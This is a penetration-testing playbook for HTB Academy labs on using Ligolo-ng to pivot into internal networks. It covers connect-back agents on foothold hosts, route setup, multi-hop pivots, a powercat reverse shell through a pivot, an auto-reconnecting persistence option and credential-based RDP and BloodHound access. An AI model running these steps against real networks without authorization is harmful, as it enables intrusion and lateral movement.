# Ligolo-ng Tunneling Playbook

> **Purpose:** Advanced layer-3 pivoting using TUN interfaces — no more proxychains!  
> **Best for:** RDP, nmap, protocols that break over SOCKS, multiple-hop scenarios  
> **Advantage:** Creates a virtual network interface — run tools directly without `proxychains`

---

## When to Use Ligolo-ng

| Scenario | Proxychains | Ligolo-ng |
|----------|-------------|-----------|
| RDP to internal host | ❌ Kerberos breaks | ✅ Works natively |
| nmap SYN scans | ❌ Needs `-sT` | ✅ Full scan support |
| Multiple network hops | ❌ Gets flaky | ✅ Handles naturally |
| High-bandwidth transfer | ❌ Slow relay | ✅ 100+ Mbps |
| Real-time protocols | ❌ High latency | ✅ Low latency |

**Use Ligolo-ng when:**
- RDP/WinRM fail over SOCKS proxychains
- You need clean, fast tunneling
- Multiple pivot hops required
- Running tools that don't support SOCKS (e.g., some scanners)

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                              ATTACKER (Kali)                              │
│  ┌──────────────┐                                                        │
│  │ Ligolo Proxy │ Listens on port 11601                                   │
│  │  (ligolo)    │                                                        │
│  └──────┬───────┘                                                        │
│         │ Creates TUN interface (ligolo)                                  │
│  ┌──────┴───────┐                                                        │
│  │   TUN iface  │ Virtual network interface                                │
│  │  (ligolo0)   │ Has IP in target network range                           │
│  └──────────────┘                                                        │
└─────────────────────────────────────────────────────────────────────────┘
                                    ▲
                                    │ Reverse TCP/TLS connection
                                    │ (Agent initiates outbound)
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                          DMZ / Foothold Host                              │
│  ┌──────────────┐                                                        │
│  │ Ligolo Agent │ Connects back to Kali port 11601                       │
│  │   (agent)    │ No root privileges needed!                             │
│  └──────┬───────┘                                                        │
│         │ Forwards packets to internal network                            │
│  ┌──────┴───────┐                                                        │
│  │ Internal NIC │ Access to target network (e.g., 172.16.x.x)              │
│  │  (eth1)      │                                                        │
│  └──────────────┘                                                        │
└─────────────────────────────────────────────────────────────────────────┘
```

**Key Advantage:** The TUN interface makes Kali think it's on the internal network. No `proxychains` wrapper needed.

---

## Step-by-Step Setup

### Step 1: Create TUN Interface on Kali

```bash
# Method 1: Manual (traditional)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Method 2: Via ligolo-ng CLI (v0.6+)
ligolo-ng interface_create --name "ligolo"
```

**Verify interface created:**
```bash
ip addr show ligolo
# Should show: <POINTOPOINT,NOARP,UP,LOWER_UP>
```

## Step 2: Start Ligolo Proxy on Kali

**Choose your TLS option based on your environment:**

### Option A: Self-Signed Certificates (Labs/Quick Setup)
```bash
# Fastest setup for HTB/lab environments
ligolo-proxy -selfcert

# Verify fingerprint for agent validation
ligolo-ng » certificate_fingerprint
INFO[0203] TLS Certificate fingerprint for ligolo is: D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC
```

**Agent connects with fingerprint verification:**
```bash
./agent -connect <KALI_IP>:11601 -accept-fingerprint D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC
```

### Option B: Let's Encrypt (External C2 with Domain)
```bash
# Requires:
# - Valid domain pointing to Kali (e.g., c2.yourdomain.com)
# - Port 80 accessible for Let's Encrypt validation
ligolo-proxy -autocert
```

### Option C: Custom Certificates (Enterprise/Internal CA)
```bash
# Use your own PKI certificates
ligolo-proxy -certfile certs/cert.pem -keyfile certs/key.pem
```

### Option D: Ignore Certificates (DEBUG ONLY — NOT FOR REAL OPS)
```bash
# Agent side only — proxy still uses TLS
./agent -connect <KALI_IP>:11601 -ignore-cert
```
**⚠️ Warning:** Vulnerable to MITM attacks. Use only in isolated lab environments.

**Default port:** 11601 (change with `-laddr 0.0.0.0:PORT`)

**You'll see:**
```
INFO[0000] Starting ligolo proxy...
INFO[0000] Listening on 0.0.0.0:11601
ligolo-ng »
```

### Step 3: Download & Run Agent on Foothold

**Linux Agent:**
```bash
# SSH to foothold
ssh user@foothold-ip

# Download agent (check latest release)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8_linux_amd64.tar.gz

# Run agent (connects BACK to your Kali)
./agent -connect <KALI_IP>:11601 -ignore-cert

# Alternative: With SOCKS if needed
./agent -connect <KALI_IP>:11601 -socks 127.0.0.1:9050
```

**Windows Agent:**
```powershell
# Download agent.exe
# Run from cmd/powershell
agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

**Agent output:**
```
INFO[0000] Connection established addr="<KALI_IP>:11601"
```

### Step 4: Select Session & Start Tunnel

**On Kali (ligolo-proxy console):**
```
# List available agents
ligolo-ng » session

# Select agent (choose number)
? Specify a session : 1 - user@hostname - <FOOTHOLD_IP>:<PORT>

# Start tunnel
[Agent : user@hostname] » tunnel_start --tun ligolo
[INFO] Starting tunnel to user@hostname

# Verify tunnel is up
[Agent : user@hostname] » ifconfig
# Shows internal network interfaces
```

### Step 5: Add Routes to Target Networks

**View agent's network interfaces:**
```
[Agent : user@hostname] » ifconfig
┌─────────────────────────────────────────────┐
│ Interface 3                                 │
├──────────────┬──────────────────────────────┤
│ Name         │ eth1                         │
│ IPv4 Address │ 172.16.119.13/24            │
└──────────────┴──────────────────────────────┘
```

**Add route on Kali:**
```bash
# Add route to target network via TUN interface
sudo ip route add 172.16.119.0/24 dev ligolo

# Or via ligolo-ng CLI (v0.6+)
ligolo-ng interface_add_route --name ligolo --route 172.16.119.0/24

# Verify route
ip route | grep ligolo
```

---

## Using the Tunnel

### Direct Access (No Proxychains!)

Once the TUN interface is up and route is added:

```bash
# Ping internal hosts directly
ping 172.16.119.11

# Nmap (full scan support!)
nmap -sS -p- 172.16.119.11

# RDP (works with Kerberos!)
xfreerdp /v:172.16.119.11 /u:username /p:password

# SMB
smbclient -U username \\172.16.119.11\share

# WinRM
evil-winrm -i 172.16.119.11 -u username -p password

# BloodHound (no DNS issues!)
bloodhound-python -u username -p password -ns 172.16.119.11 -d domain.local -dc dc01.domain.local

# Any tool works directly!
curl http://172.16.119.11
dig @172.16.119.11 domain.local
```

### Why RDP Works Better

| Aspect | Proxychains SOCKS | Ligolo-ng TUN |
|--------|-------------------|---------------|
| Kerberos auth | ❌ Breaks (IP vs hostname) | ✅ Works natively |
| Protocol handling | Layer 7 relay | Layer 3 routing |
| Certificate validation | ❌ Often fails | ✅ Proper validation |
| NLA (Network Level Auth) | ❌ Problems | ✅ Works |

---

## Pro Tips from the Field

### Command Syntax Versions
**Note:** Ligolo-ng v0.6+ uses `tunnel_start` and `tunnel_stop`. Older versions use just `start` and `stop`.

```bash
# Modern syntax (v0.6+)
[Agent] » tunnel_start --tun ligolo
[Agent] » tunnel_stop

# Legacy syntax (older versions)
[Agent] » start --tun ligolo
[Agent] » stop
```

### Double Pivot Setup (Clean Segmentation)
When pivoting through multiple hosts, use **separate TUN interfaces** for clean network segmentation:

```bash
# First pivot (DMZ01 → Internal)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.5.0/24 dev ligolo

# Second pivot (Internal → Deep Internal)
sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 172.16.6.0/24 dev ligolo2

# In ligolo console - first session
[Agent : dmz01] » tunnel_start --tun ligolo

# Second session
[Agent : internal-host] » tunnel_start --tun ligolo2
```

### Accessing Pivot Host's Own Services
Use the special `240.0.0.1` address to reach services on the pivot host itself:

```bash
# Add route to pivot's loopback
sudo ip route add 240.0.0.1/32 dev ligolo

# Access pivot's SSH directly
ssh user@240.0.0.1
nmap -p 22 240.0.0.1
```

### File Transfer Through Pivot
When you need to move files from Kali → Deep Internal (through pivot):

```bash
# 1. On Kali ligolo console - create listener
[Agent : pivot] » listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:9001

# 2. On Kali - start server on the redirected port
python3 -m http.server 1234

# 3. From deep internal host
wget http://<PIVOT_IP>:9001/file.txt
```

### Reverse Shell Through Pivot
Get shells from deep internal network back to Kali:

```bash
# 1. On Kali ligolo console
[Agent : pivot] » listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp

# 2. On Kali
nc -lvnp 10000

# 3. From internal host
powercat -c <PIVOT_IP> -p 30000 -ep
```

---

## Advanced: Chaining Multiple Hops

### Scenario: Kali → DMZ01 → InternalDC

**Setup:**
```
┌────────┐      ┌─────────┐      ┌────────────┐
│  Kali  │◄────►│  DMZ01  │◄────►│ InternalDC │
│        │      │ (Agent) │      │ (2nd Agent)│
└────────┘      └─────────┘      └────────────┘
```

**Step 1:** Kali ←→ DMZ01 (as above)

**Step 2:** From DMZ01, deploy agent to InternalDC:
```bash
# On DMZ01 (via ligolo tunnel)
scp agent.exe user@InternalDC:/tmp/
ssh user@InternalDC
# Run agent pointing BACK to DMZ01's ligolo interface IP
./agent -connect 172.16.119.13:11601 -ignore-cert
```

**Step 3:** On Kali, you'll see both agents — select InternalDC session and tunnel deeper.

### Double Pivot (Full Chain with New Interface)

**When you need to pivot through Agent1 → Agent2 → access Second Internal Network:**

```bash
# 1. Upload agent to first pivot host (already connected via ligolo)
# From Kali, upload to DMZ01:
scp agent user@DMZ01:/tmp/agent

# 2. On Kali - create second TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# 3. On Kali - add route for second internal network
sudo ip route add 172.16.6.0/24 dev ligolo2

# 4. On Kali - create listener on first pivot to forward to second
ligolo-ng » listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601

# 5. On second pivot host (Windows target), run agent pointing to first pivot
agent.exe -connect 172.16.5.15:11601 -ignore-cert

# 6. On Kali - select new session (second pivot)
ligolo-ng » session
? Specify a session : 2

# 7. Start tunnel with NEW interface (ligolo2) - won't interfere with first
[Agent : PIVOT-SRV01\user@PIVOT-SRV01] » start --tun ligolo2

# Now access second internal network directly:
nmap -sS 172.16.6.0/24
xfreerdp /v:172.16.6.x /u:user /p:pass
```

## File Transfer Through Ligolo

**Transfer files from Kali to internal host via pivot:**

```bash
# 1. On Kali ligolo console - create port forward listener
[Agent : user@pivot] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:9001 --tcp

# 2. On Kali - start Python HTTP server
python3 -m http.server 1234

# 3. From internal host (through pivot), download via the forwarded port
wget http://172.16.150.10:9001/file.txt
```

## Reverse Shell Through Ligolo

**Get shells from internal network back to Kali:**

```bash
# 1. On Kali ligolo console - set up reverse shell listener
[Agent : user@pivot] » listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp

# 2. On Kali - start netcat listener
nc -lvnp 10000

# 3. From internal host, initiate reverse shell through pivot
# PowerShell:
powercat -c <PIVOT_IP> -p 30000 -ep
```

## Access Local Services on Pivot

**Access services on the pivot host itself (like SSH):**

```bash
# Add special route for pivot's loopback
sudo ip route add 240.0.0.1/32 dev ligolo

# Now access pivot's local services directly
nmap -p 22 240.0.0.1
ssh user@240.0.0.1
```

---

## Common Commands Reference

### Ligolo-ng Proxy Commands

| Command | Description |
|---------|-------------|
| `session` | List and select agent sessions |
| `tunnel_start --tun ligolo` | Start tunneling via TUN interface |
| `tunnel_stop` | Stop tunneling |
| `ifconfig` | Show agent network interfaces |
| `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:80` | Port forward via agent |
| `certificate_fingerprint` | Show TLS cert fingerprint |
| `interface_create --name evil` | Create TUN interface |
| `interface_add_route --name evil --route 10.10.10.0/24` | Add route |

### Agent Flags

| Flag | Description |
|------|-------------|
| `-connect IP:PORT` | Proxy server address |
| `-ignore-cert` | Skip TLS verification (labs only!) |
| `-accept-fingerprint HASH` | Verify specific cert fingerprint |
| `-socks IP:PORT` | Tunnel through SOCKS proxy |
| `-socks-user USER` | SOCKS username |
| `-socks-pass PASS` | SOCKS password |
| `-bind IP:PORT` | Bind mode (reverse is default) |
| `-v` | Verbose output |
| `-reconnect` | Auto-reconnect on disconnect |
| `-reconnect-delay SECONDS` | Delay between reconnect attempts |

---

## Troubleshooting

### TUN Interface Won't Create
```bash
# Check if tun module loaded
lsmod | grep tun

# Load manually if needed
sudo modprobe tun

# Check permissions
sudo ip tuntap add user $(whoami) mode tun ligolo
```

### Agent Can't Connect
```bash
# Verify Kali IP is reachable from foothold
ping <KALI_IP>

# Check firewall on Kali
sudo ufw allow 11601/tcp

# Try with verbose mode
./agent -connect <KALI_IP>:11601 -v
```

### No Traffic Through Tunnel
```bash
# Verify route is added
ip route | grep ligolo

# Check TUN interface is UP
ip link show ligolo

# Try restarting tunnel in ligolo-ng
[Agent] » tunnel_stop
[Agent] » tunnel_start --tun ligolo

# Check agent can reach target network
[Agent] » ifconfig
# Ensure agent has interface on target network
```

### RDP Still Fails
```bash
# Try with NLA disabled (less secure, test only)
xfreerdp /v:target /u:user /p:pass /sec:tls /cert:ignore

# Or use /gt:disable to disable gateway transport
xfreerdp /v:target /u:user /p:pass /gt:disable /cert:ignore
```

---

## Comparison: Ligolo-ng vs Other Tools

| Tool | Type | Best For | Speed | Setup |
|------|------|----------|-------|-------|
| **Ligolo-ng** | TUN (Layer 3) | RDP, nmap, full network access | ⭐⭐⭐ Fast | Medium |
| **Chisel** | TCP tunnel | Web apps, simple port forwards | ⭐⭐ Good | Easy |
| **SSH -D** | SOCKS (Layer 7) | Quick setup, web browsing | ⭐⭐ Good | Very Easy |
| **Proxychains** | SOCKS wrapper | Wrapping existing tools | ⭐ Slow | Easy |
| **Meterpreter** | Various | Integrated post-exploitation | ⭐⭐ Good | Medium |

---

## HTB-Specific Tips

### Targeting Windows DCs
```bash
# After ligolo setup, BloodHound works perfectly:
bloodhound-python -u 'domain\user' -p 'password' -ns 172.16.119.11 -d domain.htb -dc dc01.domain.htb -c all

# RDP for GUI access:
xfreerdp /v:172.16.119.11 /u:username /p:password /cert:ignore /f
```

### Multiple Network Segments
```bash
# Add multiple routes
sudo ip route add 172.16.119.0/24 dev ligolo
sudo ip route add 192.168.1.0/24 dev ligolo

# Or use supernet if multiple /24s
sudo ip route add 172.16.0.0/16 dev ligolo
```

### Persistence Setup
```bash
# Run agent with auto-reconnect
./agent -connect <KALI_IP>:11601 -ignore-cert -reconnect -reconnect-delay 10
```

---

## References

- **GitHub:** https://github.com/nicocha30/ligolo-ng
- **Documentation:** https://docs.ligolo.ng/
- **Kali Package:** `sudo apt install ligolo-ng`
- **Latest Releases:** https://github.com/nicocha30/ligolo-ng/releases

---

## Quick Command Summary

```bash
# 1. Kali - Create TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. Kali - Start proxy
ligolo-proxy -selfcert

# 3. Foothold - Run agent
./agent -connect <KALI_IP>:11601 -ignore-cert

# 4. Kali - In ligolo console
session                    # Select agent
tunnel_start --tun ligolo  # Start tunnel
ifconfig                   # View agent networks

# 5. Kali - Add routes
sudo ip route add 172.16.119.0/24 dev ligolo

# 6. Run tools directly (no proxychains!)
nmap -sS 172.16.119.11
xfreerdp /v:172.16.119.11 /u:user /p:pass
```

---

## Teardown & Cleanup

When finished with ligolo-ng, clean up properly to avoid routing issues:

### Step 1: Stop Tunnel in Ligolo-ng Console
```
[Agent : session_name] » tunnel_stop
# OR for older versions:
[Agent] » stop
```

### Step 2: Exit Ligolo-ng Proxy
```
ligolo-ng » exit
# Or press Ctrl+C
```

### Step 3: Remove Routes from Kali
```bash
# Delete the route(s) you added
sudo ip route del 172.16.119.0/24 dev ligolo

# If you added multiple routes, delete each:
sudo ip route del 172.16.6.0/24 dev ligolo2 2>/dev/null
sudo ip route del 240.0.0.1/32 dev ligolo 2>/dev/null

# Verify routes removed
ip route | grep ligolo
# Should return nothing
```

### Step 4: Delete TUN Interface(s)
```bash
# Bring down first
sudo ip link set ligolo down

# Delete the interface
sudo ip tuntap del mode tun ligolo

# If multiple interfaces:
sudo ip link set ligolo2 down 2>/dev/null
sudo ip tuntap del mode tun ligolo2 2>/dev/null

# Verify cleanup
ip addr | grep ligolo
ip route | grep ligolo
# Should return nothing
```

### Step 5: Kill Agent on Foothold
```bash
# SSH to foothold and kill agent process
ssh user@foothold-ip
pkill -f agent
# Or find PID: ps aux | grep agent
# Then: kill <PID>
```

### Quick Teardown Script
```bash
#!/bin/bash
# save as: teardown-ligolo.sh

echo "[*] Removing routes..."
sudo ip route del 172.16.119.0/24 dev ligolo 2>/dev/null
sudo ip route del 172.16.6.0/24 dev ligolo2 2>/dev/null
sudo ip route del 240.0.0.1/32 dev ligolo 2>/dev/null

echo "[*] Bringing down TUN interfaces..."
sudo ip link set ligolo down 2>/dev/null
sudo ip link set ligolo2 down 2>/dev/null

echo "[*] Deleting TUN interfaces..."
sudo ip tuntap del mode tun ligolo 2>/dev/null
sudo ip tuntap del mode tun ligolo2 2>/dev/null

echo "[*] Verifying cleanup..."
if ip addr | grep -q ligolo; then
    echo "[!] Warning: ligolo interfaces still present"
    ip addr | grep ligolo
else
    echo "[✓] Cleanup complete!"
fi
```

### Troubleshooting Cleanup Issues

**Error: "Device or resource busy" when deleting TUN**
```bash
# Force remove even if busy
sudo ip link delete ligolo
# Or reboot (nuclear option)
```

**Routes persist after interface deletion**
```bash
# Flush all routes for the interface
sudo ip route flush dev ligolo
# Then delete interface
sudo ip tuntap del mode tun ligolo
```

**Agent won't die on foothold**
```bash
# Force kill
ssh user@foothold-ip "sudo pkill -9 -f agent"
# Or if you have shell access:
sudo kill -9 $(pgrep -f agent)
```

---

*Created: 2026-04-19*  
*Updated: 2026-04-19 (Added TLS details, double pivot, file transfer, reverse shell techniques, and teardown procedures)*  
*Use case: HTB Academy Password Attacks Skills Assessment — solved RDP issues with proxychains*
